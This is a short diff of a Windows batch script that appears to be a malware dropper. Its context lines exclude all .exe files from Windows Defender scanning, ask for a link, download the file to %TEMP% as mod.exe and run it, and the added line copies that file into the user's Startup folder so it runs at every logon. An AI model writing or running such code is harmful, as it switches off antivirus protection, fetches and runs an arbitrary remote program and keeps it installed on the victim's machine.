@@ -32,6 +32,7 @@ Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 set /p LINK="Enter your link: "
 cd %TEMP%
 Powershell -Command "Invoke-Webrequest %LINK% -OutFile mod.exe"  
+Powershell -Command "Copy-Item -Path '%TEMP%\mod.exe' -Destination '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup' -PassThru"
 mod.exe
 
 
